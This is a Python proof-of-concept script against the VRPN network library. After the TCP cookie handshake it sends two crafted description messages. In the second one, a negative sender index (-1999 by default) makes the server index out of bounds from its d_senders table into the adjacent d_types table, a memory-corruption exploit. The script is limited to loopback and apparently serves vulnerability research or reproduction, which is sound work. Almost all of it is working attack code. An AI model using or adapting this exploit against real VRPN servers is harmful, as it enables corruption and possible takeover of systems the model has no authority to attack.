#!/usr/bin/env python3
"""VRPN TCP client: cookie exchange, then TWO description messages on one
connection so both reach the same endpoint's translation tables.

Message 1 seeds a TYPE entry (in-bounds sender) with a recognizable name.
Message 2 uses a SENDER header sender field chosen to alias the adjacent
d_types table from d_senders (index -2001 lands on d_types.d_entry[0]).
The description NUL index stays in bounds to isolate addRemoteEntry().

Loopback only; no external hosts.
"""
import argparse
import socket
import struct
import time

COOKIE_SIZE = 24
HEADER_LEN = 24


def make_msg(sender, msgtype, index, name):
    payload = struct.pack(">i", index) + name.encode()
    n = len(payload)
    msg = struct.pack(">IIIIII", HEADER_LEN + n, 0, 0,
                      sender & 0xFFFFFFFF, msgtype & 0xFFFFFFFF, 0)
    return msg + payload + b"\0" * (-n % 8)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=15350)
    ap.add_argument("--hold", type=float, default=2.0)
    ap.add_argument("--first", choices=("type", "sender"), default="type",
                    help="which description message goes first on the connection")
    ap.add_argument("--index", type=lambda x: int(x, 0), default=4,
                    help="in-bounds description NUL index for both messages")
    ap.add_argument("--type-sender", type=lambda x: int(x, 0), default=2)
    ap.add_argument("--type-name", default="T" * 96)
    ap.add_argument("--sender-sender", type=lambda x: int(x, 0), default=-1999)
    ap.add_argument("--sender-name", default="S" * 96)
    args = ap.parse_args()

    type_msg = make_msg(args.type_sender, -2, args.index, args.type_name)
    sender_msg = make_msg(args.sender_sender, -1, args.index, args.sender_name)
    first, second = ((type_msg, sender_msg) if args.first == "type"
                     else (sender_msg, type_msg))
    with socket.create_connection(("127.0.0.1", args.port), timeout=5) as s:
        cookie = s.recv(COOKIE_SIZE)
        if len(cookie) != COOKIE_SIZE:
            raise SystemExit(f"short cookie: {cookie!r}")
        s.sendall(cookie)
        time.sleep(0.2)
        s.sendall(first)
        time.sleep(0.4)
        s.sendall(second)
        time.sleep(args.hold)
        print(f"cookie={cookie!r}")
        print(f"first={args.first} TYPE sender={args.type_sender} "
              f"len={len(type_msg)} name={args.type_name[:16]!r}")
        print(f"second SENDER sender={args.sender_sender} "
              f"len={len(sender_msg)} name={args.sender_name[:16]!r}")


if __name__ == "__main__":
    main()
